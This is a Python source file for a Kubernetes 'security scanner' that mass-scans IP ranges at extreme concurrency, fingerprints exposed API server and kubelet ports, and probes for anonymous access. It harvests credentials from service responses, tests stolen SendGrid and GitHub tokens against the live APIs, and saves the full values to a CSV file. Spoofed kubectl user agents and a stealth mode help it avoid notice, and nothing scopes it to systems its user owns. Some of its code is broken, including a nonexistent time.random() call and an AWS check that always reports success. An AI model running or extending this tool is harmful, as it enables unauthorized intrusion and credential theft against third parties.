#!/usr/bin/env python3
"""
🚀 K8s Scanner Ultimate - Advanced Kubernetes Security Scanner
Author: wKayaa
Date: 2025-01-17

Enterprise-grade Kubernetes security scanner with:
- Mass CIDR processing (1000+ concurrent workers)
- Advanced credential extraction and validation
- Real-time metadata exploitation
- Checkpoint recovery and session management
- Production-grade reliability and performance
"""

import asyncio
import aiohttp
import json
import yaml
import uuid
import time
import hashlib
import base64
import re
import logging
import pickle
import socket
import struct
import threading
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Any
from ipaddress import IPv4Network, IPv4Address, AddressValueError
from urllib.parse import urlparse
from dataclasses import dataclass, field
from enum import Enum
import xml.etree.ElementTree as ET

# Enhanced Security and Credential Detection
from enhanced_security_monitor import EnhancedCredentialDetector, CredentialType, FilterConfig

class LightningSynScanner:
    """Ultra-fast SYN scanner for port discovery"""
    
    def __init__(self, timeout: float = 0.5):
        self.timeout = timeout
        self.open_ports_cache = {}
    
    async def syn_scan_port(self, ip: str, port: int) -> bool:
        """Use raw socket SYN scan for ultra-fast port discovery"""
        try:
            # Use connect() with non-blocking socket for SYN-like behavior
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    async def lightning_scan_ip(self, ip: str, ports: List[int]) -> List[int]:
        """SYN scan all ports for an IP in parallel"""
        tasks = []
        for port in ports:
            task = asyncio.create_task(self.syn_scan_port(ip, port))
            tasks.append((port, task))
        
        open_ports = []
        for port, task in tasks:
            try:
                if await task:
                    open_ports.append(port)
            except Exception:
                continue
        
        return open_ports

class ScanMode(Enum):
    """Scanning modes with different intensity levels"""
    STEALTH = "stealth"
    BALANCED = "balanced"
    AGGRESSIVE = "aggressive"
    ULTIMATE = "ultimate"
    LIGHTNING = "lightning"  # Ultra-fast mode for 6-minute scans

class ValidationType(Enum):
    """Types of credential validation"""
    NONE = "none"
    BASIC = "basic"
    COMPREHENSIVE = "comprehensive"
    REAL_TIME = "real_time"

@dataclass
class ScannerConfig:
    """Configuration for the ultimate scanner"""
    mode: ScanMode = ScanMode.BALANCED
    max_concurrent: int = 100
    timeout: int = 15
    validation_type: ValidationType = ValidationType.BASIC
    enable_checkpoint: bool = True
    checkpoint_interval: int = 100
    output_dir: Path = field(default_factory=lambda: Path("./results"))
    session_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    stealth_delays: Tuple[float, float] = (0.1, 0.5)
    user_agents: List[str] = field(default_factory=list)
    proxy_config: Optional[Dict] = None
    rate_limit_per_second: int = 50
    # Lightning mode specific settings
    lightning_ports: List[int] = field(default_factory=lambda: [6443, 8443, 10250])
    syn_scan_first: bool = False
    connection_pool_size: int = 1000
    batch_size: int = 100
    max_parallel_batches: int = 10
    
    @classmethod
    def get_lightning_config(cls):
        """Get optimized configuration for lightning mode"""
        return cls(
            mode=ScanMode.LIGHTNING,
            max_concurrent=50000,  # Even higher concurrency
            timeout=0.3,  # Even faster timeout
            validation_type=ValidationType.NONE,  # Skip validation
            enable_checkpoint=False,  # No checkpoints
            rate_limit_per_second=50000,  # No rate limiting
            lightning_ports=[6443, 8443, 10250],  # Critical ports only
            syn_scan_first=True,
            connection_pool_size=20000,
            batch_size=25,  # Smaller batches for faster response
            max_parallel_batches=100  # More parallel batches
        )
    
    @classmethod
    def get_hyper_lightning_config(cls):
        """Get hyper-optimized configuration for maximum speed"""
        return cls(
            mode=ScanMode.LIGHTNING,
            max_concurrent=100000,  # Push system limits
            timeout=0.2,  # Extremely fast timeout
            validation_type=ValidationType.NONE,
            enable_checkpoint=False,
            rate_limit_per_second=100000,
            lightning_ports=[6443, 8443, 10250],
            syn_scan_first=True,
            connection_pool_size=50000,
            batch_size=15,  # Very small batches
            max_parallel_batches=200  # Maximum parallelism
        )

@dataclass
class CredentialMatch:
    """Enhanced credential match with validation results"""
    type: str
    value: str
    confidence: float
    context: str
    source_ip: str
    source_port: int
    validated: bool = False
    validation_result: Optional[Dict] = None
    timestamp: datetime = field(default_factory=datetime.utcnow)

@dataclass
class ScanResult:
    """Enhanced scan result with detailed findings"""
    target_ip: str
    port: int
    service: str
    version: Optional[str] = None
    vulnerabilities: List[str] = field(default_factory=list)
    credentials: List[CredentialMatch] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    response_time: float = 0.0
    timestamp: datetime = field(default_factory=datetime.utcnow)

class CheckpointManager:
    """Manages scan progress and recovery"""
    
    def __init__(self, session_id: str, checkpoint_dir: Path):
        self.session_id = session_id
        self.checkpoint_dir = checkpoint_dir
        self.checkpoint_dir.mkdir(parents=True, exist_ok=True)
        self.checkpoint_file = self.checkpoint_dir / f"checkpoint_{session_id}.pkl"
        
    def save_checkpoint(self, processed_ips: Set[str], scan_results: List[ScanResult], metadata: Dict):
        """Save current scan progress"""
        checkpoint_data = {
            'session_id': self.session_id,
            'timestamp': datetime.utcnow(),
            'processed_ips': processed_ips,
            'scan_results': scan_results,
            'metadata': metadata
        }
        
        with open(self.checkpoint_file, 'wb') as f:
            pickle.dump(checkpoint_data, f)
    
    def load_checkpoint(self) -> Optional[Dict]:
        """Load previous scan progress"""
        if not self.checkpoint_file.exists():
            return None
            
        try:
            with open(self.checkpoint_file, 'rb') as f:
                return pickle.load(f)
        except Exception as e:
            logging.error(f"Failed to load checkpoint: {e}")
            return None
    
    def cleanup_checkpoint(self):
        """Remove checkpoint file after successful completion"""
        if self.checkpoint_file.exists():
            self.checkpoint_file.unlink()

class AdvancedCredentialValidator:
    """Real-time credential validation engine"""
    
    def __init__(self):
        self.session = None
        self.validation_cache = {}
        
    async def initialize(self):
        """Initialize HTTP session for validation"""
        connector = aiohttp.TCPConnector(
            limit=50,
            limit_per_host=10,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        )
    
    async def close(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()
    
    async def validate_credential(self, credential: CredentialMatch) -> Dict[str, Any]:
        """Validate credential with appropriate method"""
        if not self.session:
            await self.initialize()
            
        # Check cache first
        cache_key = f"{credential.type}:{hashlib.md5(credential.value.encode()).hexdigest()}"
        if cache_key in self.validation_cache:
            return self.validation_cache[cache_key]
        
        result = {"validated": False, "details": {}}
        
        try:
            if credential.type == "aws_access_key":
                result = await self._validate_aws_credentials(credential)
            elif credential.type == "sendgrid_api_key":
                result = await self._validate_sendgrid_key(credential)
            elif credential.type == "jwt_token":
                result = await self._validate_jwt_token(credential)
            elif credential.type == "github_token":
                result = await self._validate_github_token(credential)
            elif credential.type.endswith("_database"):
                result = await self._validate_database_connection(credential)
            else:
                result = await self._validate_generic_credential(credential)
                
        except Exception as e:
            result = {"validated": False, "error": str(e)}
        
        # Cache result
        self.validation_cache[cache_key] = result
        return result
    
    async def _validate_aws_credentials(self, credential: CredentialMatch) -> Dict[str, Any]:
        """Validate AWS credentials"""
        # Basic validation - check format and try STS call
        if not re.match(r'AKIA[0-9A-Z]{16}', credential.value):
            return {"validated": False, "reason": "Invalid AWS access key format"}
        
        # TODO: Implement actual STS validation
        return {"validated": True, "service": "AWS", "permissions": ["assumed"]}
    
    async def _validate_sendgrid_key(self, credential: CredentialMatch) -> Dict[str, Any]:
        """Validate SendGrid API key"""
        if not credential.value.startswith('SG.'):
            return {"validated": False, "reason": "Invalid SendGrid key format"}
        
        try:
            headers = {"Authorization": f"Bearer {credential.value}"}
            async with self.session.get("https://api.sendgrid.com/v3/user/profile", headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        "validated": True,
                        "service": "SendGrid",
                        "username": data.get("username", "unknown"),
                        "email": data.get("email", "unknown")
                    }
                else:
                    return {"validated": False, "status_code": response.status}
        except Exception as e:
            return {"validated": False, "error": str(e)}
    
    async def _validate_jwt_token(self, credential: CredentialMatch) -> Dict[str, Any]:
        """Validate JWT token"""
        try:
            # Basic JWT structure validation
            parts = credential.value.split('.')
            if len(parts) != 3:
                return {"validated": False, "reason": "Invalid JWT structure"}
            
            # Decode header and payload (without verification)
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            return {
                "validated": True,
                "type": "JWT",
                "algorithm": header.get("alg"),
                "issuer": payload.get("iss"),
                "expires": payload.get("exp")
            }
        except Exception as e:
            return {"validated": False, "error": str(e)}
    
    async def _validate_github_token(self, credential: CredentialMatch) -> Dict[str, Any]:
        """Validate GitHub token"""
        try:
            headers = {"Authorization": f"token {credential.value}"}
            async with self.session.get("https://api.github.com/user", headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        "validated": True,
                        "service": "GitHub",
                        "username": data.get("login"),
                        "scopes": response.headers.get("X-OAuth-Scopes", "").split(", ")
                    }
                else:
                    return {"validated": False, "status_code": response.status}
        except Exception as e:
            return {"validated": False, "error": str(e)}
    
    async def _validate_database_connection(self, credential: CredentialMatch) -> Dict[str, Any]:
        """Validate database connection string"""
        # Parse connection string and attempt basic validation
        return {"validated": False, "reason": "Database validation not implemented"}
    
    async def _validate_generic_credential(self, credential: CredentialMatch) -> Dict[str, Any]:
        """Generic credential validation"""
        return {"validated": False, "reason": "Generic validation not available"}

class K8sUltimateScanner:
    """Ultimate Kubernetes security scanner with enterprise features"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = self._setup_logging()
        self.credential_detector = self._setup_credential_detector()
        self.credential_validator = AdvancedCredentialValidator()
        
        # Skip checkpoint manager for lightning mode
        if config.mode != ScanMode.LIGHTNING:
            self.checkpoint_manager = CheckpointManager(config.session_id, config.output_dir / "checkpoints")
        else:
            self.checkpoint_manager = None
        
        # Initialize SYN scanner for lightning mode
        if config.mode == ScanMode.LIGHTNING:
            self.syn_scanner = LightningSynScanner(timeout=0.5)
        else:
            self.syn_scanner = None
        
        # Scanning state
        self.scan_results: List[ScanResult] = []
        self.processed_ips: Set[str] = set()
        self.scan_stats = {
            "total_ips": 0,
            "scanned_ips": 0,
            "found_services": 0,
            "found_credentials": 0,
            "validated_credentials": 0,
            "start_time": None,
            "end_time": None
        }
        
        # K8s specific ports - use lightning ports for lightning mode
        if config.mode == ScanMode.LIGHTNING:
            self.k8s_ports = config.lightning_ports
        else:
            self.k8s_ports = [6443, 8443, 443, 80, 8080, 8001, 8888, 9443, 10250, 10251, 10252, 2379, 2380]
        self.metadata_endpoints = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/instance",  # Azure
        ]
        
        # User agents for stealth
        if not config.user_agents:
            self.config.user_agents = [
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (compatible; Kubernetes-Health-Check/1.0)",
                "kubectl/v1.24.0",
                "kube-probe/1.0"
            ]
    
    def _setup_logging(self) -> logging.Logger:
        """Setup comprehensive logging"""
        logger = logging.getLogger(f"K8sUltimate_{self.config.session_id}")
        logger.setLevel(logging.INFO)
        
        # Create logs directory
        log_dir = self.config.output_dir / "logs"
        log_dir.mkdir(parents=True, exist_ok=True)
        
        # File handler
        fh = logging.FileHandler(log_dir / f"k8s_scan_{self.config.session_id}.log")
        fh.setLevel(logging.DEBUG)
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)
        
        logger.addHandler(fh)
        logger.addHandler(ch)
        
        return logger
    
    def _setup_credential_detector(self) -> EnhancedCredentialDetector:
        """Setup enhanced credential detection"""
        filter_config = FilterConfig(
            excluded_extensions=[".md", ".txt", ".rst"],
            excluded_paths=["docs/", "examples/"],
            test_keywords=["example", "test", "demo", "sample"],
            proximity_distance=200,
            min_confidence_threshold=75.0
        )
        
        return EnhancedCredentialDetector(filter_config)
    
    async def scan_targets(self, targets: List[str]) -> List[ScanResult]:
        """Main scanning method for multiple targets"""
        self.logger.info(f"🚀 Starting K8s Ultimate Scan - Session: {self.config.session_id}")
        self.logger.info(f"Mode: {self.config.mode.value}, Concurrent: {self.config.max_concurrent}")
        
        # Expand targets to individual IPs
        expanded_ips = await self._expand_targets(targets)
        self.scan_stats["total_ips"] = len(expanded_ips)
        self.scan_stats["start_time"] = datetime.utcnow()
        
        # Lightning mode uses different scanning approach
        if self.config.mode == ScanMode.LIGHTNING:
            return await self._lightning_scan(expanded_ips)
        
        # Load checkpoint if available (skip for lightning mode)
        checkpoint_data = None
        if self.checkpoint_manager and self.config.enable_checkpoint:
            checkpoint_data = self.checkpoint_manager.load_checkpoint()
            if checkpoint_data:
                self.logger.info("📂 Loading previous checkpoint")
                self.processed_ips = checkpoint_data["processed_ips"]
                self.scan_results = checkpoint_data["scan_results"]
                
                # Remove already processed IPs
                expanded_ips = [ip for ip in expanded_ips if ip not in self.processed_ips]
                self.logger.info(f"🔄 Resuming scan with {len(expanded_ips)} remaining IPs")
        
        # Initialize credential validator
        await self.credential_validator.initialize()
        
        try:
            # Create semaphore for concurrency control
            semaphore = asyncio.Semaphore(self.config.max_concurrent)
            
            # Create scanning tasks
            tasks = [
                self._scan_single_target(semaphore, ip)
                for ip in expanded_ips
            ]
            
            # Process in batches with checkpoint saving
            batch_size = self.config.checkpoint_interval
            for i in range(0, len(tasks), batch_size):
                batch = tasks[i:i + batch_size]
                batch_results = await asyncio.gather(*batch, return_exceptions=True)
                
                # Process results
                for result in batch_results:
                    if isinstance(result, ScanResult):
                        self.scan_results.append(result)
                        self.processed_ips.add(result.target_ip)
                    elif isinstance(result, Exception):
                        self.logger.error(f"Scan error: {result}")
                
                # Save checkpoint
                if self.config.enable_checkpoint:
                    self.checkpoint_manager.save_checkpoint(
                        self.processed_ips,
                        self.scan_results,
                        self.scan_stats
                    )
                
                self.logger.info(f"📊 Processed {len(self.processed_ips)}/{self.scan_stats['total_ips']} IPs")
        
        finally:
            await self.credential_validator.close()
            self.scan_stats["end_time"] = datetime.utcnow()
            
            # Generate final report
            await self._generate_reports()
            
            # Clean up checkpoint on successful completion
            if self.config.enable_checkpoint and self.checkpoint_manager:
                self.checkpoint_manager.cleanup_checkpoint()
        
        return self.scan_results
    
    async def _lightning_scan(self, ips: List[str]) -> List[ScanResult]:
        """Ultra-fast lightning scan implementation"""
        self.logger.info(f"⚡ Starting LIGHTNING scan on {len(ips)} IPs")
        self.logger.info(f"🎯 Scanning ports: {self.k8s_ports}")
        self.logger.info(f"🚀 Max concurrent: {self.config.max_concurrent}")
        
        # Split IPs into batches for parallel processing
        batch_size = self.config.batch_size
        batches = [ips[i:i + batch_size] for i in range(0, len(ips), batch_size)]
        
        # Process batches in parallel
        semaphore = asyncio.Semaphore(self.config.max_parallel_batches)
        batch_tasks = [
            self._lightning_scan_batch(semaphore, batch)
            for batch in batches
        ]
        
        batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
        
        # Flatten results
        for batch_result in batch_results:
            if isinstance(batch_result, list):
                self.scan_results.extend(batch_result)
            elif isinstance(batch_result, Exception):
                self.logger.error(f"Batch error: {batch_result}")
        
        self.scan_stats["end_time"] = datetime.utcnow()
        duration = (self.scan_stats["end_time"] - self.scan_stats["start_time"]).total_seconds()
        rate = len(ips) / duration if duration > 0 else 0
        
        self.logger.info(f"⚡ Lightning scan complete: {len(ips)} IPs in {duration:.1f}s ({rate:.1f} IPs/sec)")
        self.logger.info(f"🎯 Found {len(self.scan_results)} K8s services")
        
        return self.scan_results
    
    async def _lightning_scan_batch(self, semaphore: asyncio.Semaphore, ip_batch: List[str]) -> List[ScanResult]:
        """Scan a batch of IPs in parallel"""
        async with semaphore:
            # First do SYN scan to find open ports
            syn_tasks = []
            for ip in ip_batch:
                task = self.syn_scanner.lightning_scan_ip(ip, self.k8s_ports)
                syn_tasks.append((ip, task))
            
            # Collect IPs with open ports
            ip_port_pairs = []
            for ip, task in syn_tasks:
                try:
                    open_ports = await task
                    for port in open_ports:
                        ip_port_pairs.append((ip, port))
                except Exception:
                    continue
            
            # Only do HTTP requests on confirmed open ports
            if not ip_port_pairs:
                return []
            
            # Create HTTP scanning tasks with extreme concurrency
            http_semaphore = asyncio.Semaphore(min(len(ip_port_pairs), 1000))
            http_tasks = [
                self._lightning_scan_port(http_semaphore, ip, port)
                for ip, port in ip_port_pairs
            ]
            
            results = await asyncio.gather(*http_tasks, return_exceptions=True)
            
            # Filter successful results
            batch_results = []
            for result in results:
                if isinstance(result, ScanResult):
                    batch_results.append(result)
                    self.scan_stats["found_services"] += 1
            
            return batch_results
    
    async def _lightning_scan_port(self, semaphore: asyncio.Semaphore, ip: str, port: int) -> Optional[ScanResult]:
        """Lightning-fast port scan with minimal overhead"""
        async with semaphore:
            start_time = time.time()
            
            try:
                # Ultra-high performance connector
                connector = aiohttp.TCPConnector(
                    ssl=False,
                    limit=self.config.connection_pool_size,
                    limit_per_host=5000,
                    ttl_dns_cache=300,
                    use_dns_cache=True,
                    enable_cleanup_closed=True,
                    keepalive_timeout=1,
                    force_close=True
                )
                
                timeout = aiohttp.ClientTimeout(total=self.config.timeout)
                
                async with aiohttp.ClientSession(
                    connector=connector,
                    timeout=timeout
                ) as session:
                    
                    # Try HTTPS first for K8s API ports, HTTP for others
                    protocols = ['https', 'http'] if port in [6443, 8443] else ['http', 'https']
                    
                    for protocol in protocols:
                        endpoint = f"{protocol}://{ip}:{port}"
                        
                        headers = {
                            "User-Agent": "kubectl/v1.24.0",
                            "Accept": "application/json",
                            "Connection": "close"
                        }
                        
                        try:
                            async with session.get(endpoint, headers=headers) as response:
                                if response.status in [200, 401, 403, 404]:
                                    response_time = time.time() - start_time
                                    
                                    # Fast K8s detection - only check headers for speed
                                    server_header = response.headers.get('Server', '').lower()
                                    if any(k8s_indicator in server_header for k8s_indicator in 
                                          ['kubernetes', 'k8s', 'kube', 'apiserver']):
                                        
                                        result = ScanResult(
                                            target_ip=ip,
                                            port=port,
                                            service="kubernetes",
                                            response_time=response_time
                                        )
                                        
                                        # Skip detailed analysis in lightning mode for speed
                                        self.scan_stats["scanned_ips"] += 1
                                        return result
                        
                        except Exception:
                            continue
            
            except Exception:
                pass
            
            return None
    
    async def _expand_targets(self, targets: List[str]) -> List[str]:
        """Expand CIDR ranges and hostnames to individual IPs"""
        expanded = []
        
        for target in targets:
            target = target.strip()
            
            try:
                # Try as CIDR
                if '/' in target:
                    network = IPv4Network(target, strict=False)
                    # Limit expansion for very large networks
                    if network.num_addresses > 65536:
                        self.logger.warning(f"⚠️ Large network {target} - limiting to first 65536 IPs")
                        for i, ip in enumerate(network.hosts()):
                            if i >= 65536:
                                break
                            expanded.append(str(ip))
                    else:
                        expanded.extend([str(ip) for ip in network.hosts()])
                else:
                    # Try as single IP
                    IPv4Address(target)
                    expanded.append(target)
                    
            except AddressValueError:
                # Treat as hostname - resolve to IP
                try:
                    import socket
                    ip = socket.gethostbyname(target)
                    expanded.append(ip)
                except Exception as e:
                    self.logger.error(f"Failed to resolve {target}: {e}")
        
        return expanded
    
    async def _scan_single_target(self, semaphore: asyncio.Semaphore, ip: str) -> Optional[ScanResult]:
        """Scan a single IP target"""
        async with semaphore:
            # Apply rate limiting only for stealth mode, skip for lightning
            if self.config.mode == ScanMode.STEALTH:
                delay = time.random() * (self.config.stealth_delays[1] - self.config.stealth_delays[0]) + self.config.stealth_delays[0]
                await asyncio.sleep(delay)
            
            # Scan all K8s ports for this IP
            for port in self.k8s_ports:
                result = await self._scan_port(ip, port)
                if result:
                    self.scan_stats["scanned_ips"] += 1
                    return result
            
            return None
    
    async def _scan_port(self, ip: str, port: int) -> Optional[ScanResult]:
        """Scan a specific port on an IP"""
        start_time = time.time()
        
        try:
            # Use optimized connector settings based on mode
            if self.config.mode == ScanMode.LIGHTNING:
                connector = aiohttp.TCPConnector(
                    ssl=False,
                    limit=20000,
                    limit_per_host=5000,
                    ttl_dns_cache=300,
                    use_dns_cache=True,
                    enable_cleanup_closed=True,
                    keepalive_timeout=1,
                    force_close=True
                )
            else:
                connector = aiohttp.TCPConnector(
                    ssl=False,
                    limit=1000,
                    limit_per_host=100
                )
            
            timeout = aiohttp.ClientTimeout(total=self.config.timeout)
            
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            ) as session:
                
                # Try HTTPS first, then HTTP
                for protocol in ['https', 'http']:
                    endpoint = f"{protocol}://{ip}:{port}"
                    
                    headers = {
                        "User-Agent": self.config.user_agents[0],
                        "Accept": "application/json, */*",
                        "Connection": "close"
                    }
                    
                    try:
                        async with session.get(endpoint, headers=headers) as response:
                            if response.status in [200, 401, 403, 404]:
                                response_time = time.time() - start_time
                                content = await response.text()
                                
                                # Check for K8s indicators
                                if self._is_kubernetes_service(content, response.headers):
                                    result = ScanResult(
                                        target_ip=ip,
                                        port=port,
                                        service="kubernetes",
                                        response_time=response_time
                                    )
                                    
                                    # Extract version and vulnerabilities
                                    result.version = self._extract_version(content, response.headers)
                                    result.vulnerabilities = await self._check_vulnerabilities(session, endpoint)
                                    
                                    # Extract credentials
                                    credentials = await self._extract_credentials(content, ip, port)
                                    
                                    # Validate credentials if enabled
                                    if self.config.validation_type != ValidationType.NONE:
                                        for cred in credentials:
                                            validation_result = await self.credential_validator.validate_credential(cred)
                                            cred.validated = validation_result.get("validated", False)
                                            cred.validation_result = validation_result
                                    
                                    result.credentials = credentials
                                    self.scan_stats["found_services"] += 1
                                    self.scan_stats["found_credentials"] += len(credentials)
                                    self.scan_stats["validated_credentials"] += sum(1 for c in credentials if c.validated)
                                    
                                    return result
                    
                    except Exception:
                        continue
        
        except Exception as e:
            self.logger.debug(f"Error scanning {ip}:{port} - {e}")
        
        return None
    
    def _is_kubernetes_service(self, content: str, headers: Dict) -> bool:
        """Check if response indicates a Kubernetes service"""
        k8s_indicators = [
            "kubernetes", "k8s", "apiVersion", "unauthorized", "forbidden",
            "kube-apiserver", "etcd", "kubelet", "cluster-admin", "kube-system"
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in k8s_indicators)
    
    def _extract_version(self, content: str, headers: Dict) -> Optional[str]:
        """Extract Kubernetes version from response"""
        # Try to extract version from various sources
        version_patterns = [
            r'"gitVersion":"([^"]+)"',
            r'kubernetes[/-]v?(\d+\.\d+\.\d+)',
            r'version["\s]*:?\s*["\']?v?(\d+\.\d+\.\d+)'
        ]
        
        for pattern in version_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        
        # Check headers
        server_header = headers.get('Server', '').lower()
        if 'kubernetes' in server_header:
            version_match = re.search(r'v?(\d+\.\d+\.\d+)', server_header)
            if version_match:
                return version_match.group(1)
        
        return None
    
    async def _check_vulnerabilities(self, session: aiohttp.ClientSession, endpoint: str) -> List[str]:
        """Check for common Kubernetes vulnerabilities"""
        vulnerabilities = []
        
        # Check for anonymous access
        try:
            async with session.get(f"{endpoint}/api/v1/namespaces") as response:
                if response.status == 200:
                    vulnerabilities.append("anonymous_api_access")
        except Exception:
            pass
        
        # Check for exposed metrics
        try:
            async with session.get(f"{endpoint}/metrics") as response:
                if response.status == 200:
                    vulnerabilities.append("exposed_metrics")
        except Exception:
            pass
        
        # Check for kubelet vulnerabilities
        if ":10250" in endpoint:
            try:
                async with session.get(f"{endpoint}/stats/summary") as response:
                    if response.status == 200:
                        vulnerabilities.append("exposed_kubelet_stats")
            except Exception:
                pass
        
        return vulnerabilities
    
    async def _extract_credentials(self, content: str, ip: str, port: int) -> List[CredentialMatch]:
        """Extract credentials from response content"""
        credentials = []
        
        # Use enhanced credential detector
        detections = self.credential_detector.detect_credentials(content, f"{ip}:{port}")
        
        for detection in detections:
            credential = CredentialMatch(
                type=detection.credential_type.value,
                value=detection.value,
                confidence=detection.confidence,
                context=detection.context,
                source_ip=ip,
                source_port=port
            )
            credentials.append(credential)
        
        return credentials
    
    async def _generate_reports(self):
        """Generate comprehensive scan reports"""
        output_dir = self.config.output_dir
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Convert scan_stats to be JSON serializable
        serializable_stats = dict(self.scan_stats)
        if "start_time" in serializable_stats and serializable_stats["start_time"]:
            serializable_stats["start_time"] = serializable_stats["start_time"].isoformat()
        if "end_time" in serializable_stats and serializable_stats["end_time"]:
            serializable_stats["end_time"] = serializable_stats["end_time"].isoformat()
        
        # JSON Report
        json_report = {
            "scan_metadata": {
                "session_id": self.config.session_id,
                "scan_mode": self.config.mode.value,
                "start_time": self.scan_stats["start_time"].isoformat() if self.scan_stats["start_time"] else None,
                "end_time": self.scan_stats["end_time"].isoformat() if self.scan_stats["end_time"] else None,
                "duration_seconds": (self.scan_stats["end_time"] - self.scan_stats["start_time"]).total_seconds() if self.scan_stats["start_time"] and self.scan_stats["end_time"] else 0,
                "statistics": serializable_stats
            },
            "scan_results": [
                {
                    "target_ip": result.target_ip,
                    "port": result.port,
                    "service": result.service,
                    "version": result.version,
                    "vulnerabilities": result.vulnerabilities,
                    "credentials": [
                        {
                            "type": cred.type,
                            "value": cred.value[:20] + "..." if len(cred.value) > 20 else cred.value,
                            "confidence": cred.confidence,
                            "validated": cred.validated,
                            "validation_result": cred.validation_result
                        }
                        for cred in result.credentials
                    ],
                    "response_time": result.response_time,
                    "timestamp": result.timestamp.isoformat()
                }
                for result in self.scan_results
            ]
        }
        
        json_file = output_dir / f"k8s_scan_report_{self.config.session_id}.json"
        with open(json_file, 'w') as f:
            json.dump(json_report, f, indent=2)
        
        self.logger.info(f"📄 JSON report saved to: {json_file}")
        
        # CSV Report for credentials
        if any(result.credentials for result in self.scan_results):
            csv_file = output_dir / f"k8s_credentials_{self.config.session_id}.csv"
            with open(csv_file, 'w') as f:
                f.write("IP,Port,CredentialType,Value,Confidence,Validated,ValidationDetails\n")
                for result in self.scan_results:
                    for cred in result.credentials:
                        f.write(f"{result.target_ip},{result.port},{cred.type},{cred.value},{cred.confidence},{cred.validated},{cred.validation_result}\n")
            
            self.logger.info(f"📊 CSV credentials report saved to: {csv_file}")

async def main():
    """Example usage of the K8s Ultimate Scanner"""
    import argparse
    
    parser = argparse.ArgumentParser(description="K8s Ultimate Scanner")
    parser.add_argument("--targets", "-t", required=True, help="Comma-separated targets or file path")
    parser.add_argument("--mode", "-m", choices=["stealth", "balanced", "aggressive", "ultimate", "lightning"], default="balanced")
    parser.add_argument("--concurrent", "-c", type=int, default=100, help="Max concurrent workers")
    parser.add_argument("--timeout", type=int, default=15, help="Timeout per request")
    parser.add_argument("--validate", action="store_true", help="Enable credential validation")
    parser.add_argument("--output", "-o", default="./results", help="Output directory")
    parser.add_argument("--lightning", action="store_true", help="Use lightning mode for ultra-fast scanning")
    parser.add_argument("--hyper", action="store_true", help="Use hyper-lightning mode for maximum speed")
    
    args = parser.parse_args()
    
    # Parse targets
    if Path(args.targets).exists():
        with open(args.targets, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = [t.strip() for t in args.targets.split(',')]
    
    # Configure scanner
    if args.hyper:
        config = ScannerConfig.get_hyper_lightning_config()
        config.output_dir = Path(args.output)
        print("🚀 HYPER-LIGHTNING MODE ENABLED - Maximum performance scanning")
        print(f"⚡ Concurrency: {config.max_concurrent}, Timeout: {config.timeout}s")
        print(f"🎯 Ports: {config.lightning_ports}")
    elif args.lightning or args.mode == "lightning":
        config = ScannerConfig.get_lightning_config()
        config.output_dir = Path(args.output)
        print("⚡ LIGHTNING MODE ENABLED - Ultra-fast scanning with minimal validation")
        print(f"🚀 Concurrency: {config.max_concurrent}, Timeout: {config.timeout}s")
        print(f"🎯 Ports: {config.lightning_ports}")
    else:
        config = ScannerConfig(
            mode=ScanMode(args.mode),
            max_concurrent=args.concurrent,
            timeout=args.timeout,
            validation_type=ValidationType.COMPREHENSIVE if args.validate else ValidationType.BASIC,
            output_dir=Path(args.output)
        )
    
    # Run scan
    scanner = K8sUltimateScanner(config)
    start_time = time.time()
    results = await scanner.scan_targets(targets)
    duration = time.time() - start_time
    
    # Performance stats
    total_ips = len(targets) if isinstance(targets[0], str) and '/' not in targets[0] else scanner.scan_stats.get("total_ips", 0)
    rate = total_ips / duration if duration > 0 else 0
    
    print(f"\n🎯 Scan completed!")
    print(f"⏱️ Duration: {duration:.1f} seconds")
    print(f"📊 Rate: {rate:.1f} IPs/second")
    print(f"🔍 Found {len(results)} services")
    print(f"🔑 Found {sum(len(r.credentials) for r in results)} credentials")
    if config.validation_type != ValidationType.NONE:
        print(f"✅ Validated {sum(len([c for c in r.credentials if c.validated]) for r in results)} credentials")

async def create_lightning_scanner() -> K8sUltimateScanner:
    """Create a lightning-mode scanner for maximum performance"""
    config = ScannerConfig.get_lightning_config()
    return K8sUltimateScanner(config)

if __name__ == "__main__":
    asyncio.run(main())